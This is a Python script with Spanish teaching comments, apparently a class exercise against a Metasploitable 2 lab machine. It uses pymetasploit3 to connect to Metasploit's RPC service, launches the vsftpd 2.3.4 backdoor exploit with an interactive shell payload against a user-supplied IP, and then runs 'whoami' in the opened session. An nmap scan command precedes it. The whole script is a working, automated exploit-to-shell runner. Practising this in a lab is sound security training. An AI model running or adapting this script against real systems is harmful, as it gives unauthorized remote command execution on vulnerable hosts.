# nmap -sV -Pn 192.168.2.2
# sV es para que nos de  los servicios

"""
Para utilizar cualqueir modulo de metaexploit 

Despues de una busqueda podemos utiliza el identificador del ModuleNotFoundError
si no sabemos la referencia

- search Samba (o el nombre del modulo)

- use exploit/ ----- MAs dos veces al tabulador y vemos todos lo metodos de explotacion

use exploit/linux/samba/
"""

#Sin embargo podemos realizar todo el proceso con un script en python
# pip install pymetasploit3

# La comunicacion de  GSG RPC dentro de la libreria mfs.rpc

# Para poder utilizar el script tienen que estar la consola de metasplot abierta.
# i.lower().strp()load msgrpc Pass=password (el password que queramos)
# Levantamos el servicio y le indicamos a metasploit como queremos trabajar

from pymetasploit3.msfrpc import MsfRpcClient

# import the time module
import time

# creamos un metodo para conectarnos
# LE pasamos el puerto donde se ha levantado el servidor

def connect(password, port=55552):

    try:

        # creamos el lciente que recibe la contrase;a y el puerto

        client = MsfRpcClient(password, port=port)

        # esto nos devuelve un cliente que puede utilizar el servicio de metasplit
        return client
    except:

        # Si hay error hay que revisar la version de message back que tengo instalado
        # Es un formato que compacta los mensajes mucho, parecido a json
        # Si da problemas decirle al profe
        return None

# Aqui cojemos la informacion del cliente lo creamos
ipAddress = input('Introduce la IP de Metasploitable 2: ')
password = input('Password del servicio: ')
port = input('Introduce el puerto donde se ejecuta el servicio: ')

client = connect(password, port)

# SI el cleinte existe

if client is not None:
    # Declaramos un objeto de tipo exploit
    # Es lo mismo que se hace en consola 
    # creamos variable para cliente para utilizar los modulos.
    # USE --------- use exploit/linux/samba/
#-----------------------#
#    CHANGE             #
#-----------------------#
    # Utiliza un modlulo de tipo exploit y damos la direccion donde esta
    exploit = client.modules.use('exploit','unix/ftp/vsftpd_234_backdoor')

    # lo mismo hacemos con Options
    exploit.options

    # EL objeto exploit dentro de la clave del diccionario RHOSTS y la direccion objetivo
    exploit['RHOSTS']= ipAddress
#-----------------------#
#    CHANGE             #
#-----------------------#
    # Ahora solo cargamos el payload
    pl = client.modules.use('payload', 'cmd/unix/interact')

#-----------------------#
#    CHANGE             #
#-----------------------#
    # Esto es lo que me sale cuando ejecuto OPTION en la console de metasploit, y lo tengo que agregar aqui par ala coneccion
    # pl['LHOST'] = '192.168.1.30'
    # pl['LPORT'] = '4444'

    # COn metasploid se nos generan multiples consolas
    # Necesitamos tener un ID para poder acceder a cada consola
    # Entones accedemos a las consolas y no a los modulos

    console_id = client.consoles.console().cid
    console = client.consoles.console(console_id )

    # Cunado ya todo esta listo solo tenemos que explotar la vulnerabilidad con el comando EXPLOIT
    # EL payload es el que acabo de crear con PL
    exploit.execute(payload=pl)
#-----------------------#
#    CHANGE             #
#-----------------------#
    # SI se enclocha me puede generar un error de timeout
    # Para ello importo el modulo de TIME y hago una espera
    # Jugamos con la espera para que no nos de error
    time.sleep(10)

    # Finalmente vemos las sessiones que tenemos activas.
    # Es igual que en consola cunado lasnzamos el ataque teenmos una sessio activa
    print(client.sessions.list)

    # Ahora abrimos la consola pra escribir comandos. La recojemos de la session que tenemos activa
    shell = client.sessions.session('1')


    # POngo los comandos a ejecutar varias veces porque se puede quedar pillado, se pierde el paquete y no llega, hace un timeout, 
    shell.write('whoami')

    print(shell.read())

    shell.write('whoami')

    print(shell.read())

    shell.write('whoami')

    print(shell.read())
else:

    print('No se ha podido estabelcer la coneccion con el servicio MSGRPC')